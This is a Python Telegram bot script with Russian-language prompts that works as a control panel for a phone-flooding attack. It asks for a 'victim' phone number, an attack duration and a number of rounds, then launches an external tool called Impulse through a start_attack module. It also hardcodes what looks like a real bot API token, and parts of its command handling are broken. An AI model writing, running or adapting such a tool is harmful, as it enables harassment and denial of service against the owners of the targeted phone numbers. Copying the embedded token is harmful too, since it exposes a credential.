# -*- coding: utf-8 -*-
# Import modules
import start_attack, help
import telebot
bot = telebot.TeleBot("1884845165:AAE51LVnKOW2_tmgXyCpsC1nu-a-JXIYBuc")
#################################################################################################################
help = help.h()
########################################################################################################################
## Обработка команд
@bot.message_handler(commands=['Start', 'Help'])
def send_welcome(message):
	if message.commands == "Start":
		bot.send_message(message.chat.id, "Введите номер жертвы в формате - \"+7**********\"")
	elif message.commands == "Help":
		bot.send_message(message.chat.id, help())
	else:
		bot.send_message(message.chat.id, "Такой команды не существует, введите /Help")
# Обработка сообщений
@bot.message_handler(content_types =['text'])
def start(message):
	if message.text == '/reg':   #Приветствие при регистрации
		bot.send_message(message.chat.id, "Приветствую. Для получения справки введите команду /Help")
	else:
		bot.send_message(message.chat.id, "Неизвестная команда, введите команду /Help")
# Получение парамметров необходимых для запуска impulse
def send_number(message):
	global par_number
	par_number = message.text
	bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\n Введите продолжительность атаки в секундах \n time = ")
	bot.register_next_step_handler(message, send_time)

def send_time(message):
	global par_number, par_time
	par_time = message.text
	bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\n time = " + par_time + "\n Введите количество кругов атаки \n threads = ")
	bot.register_next_step_handler(message, send_threads)

def send_threads(message):
	global par_number, par_time, par_threads
	par_threads = message.text
	bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\n time = " + par_time + "\n threads = " + par_threads + "\n Чтобы начать атаку введите \"Атака\"")
	bot.register_next_step_handler(message, send_start_attack)
##################################################################################################
## Начало атаки - запуск приложения Impulse с полученными параметрами
# Запускаем атаку
def send_start_attack(message):
	global result, answer
	if message.text == "Атака":
		bot.send_message(message.chat.id, "Атака началась")
		result = start_attack.sa(par_time, par_threads, par_number) # подключается модуль с функцией, которая запускает impulse
	else:
		bot.send_message(message.chat.id, "Чтобы начать атаку введите \"Атака\"")
	# Проверяем  выполнение атаки
	print(result.stdout)
	if result != 0:
		answer = "Атака завершена. \nВведите номер новой жетвы"
		bot.send_message(message.chat.id, answer)



#################################################################################################

bot.polling( none_stop = True) 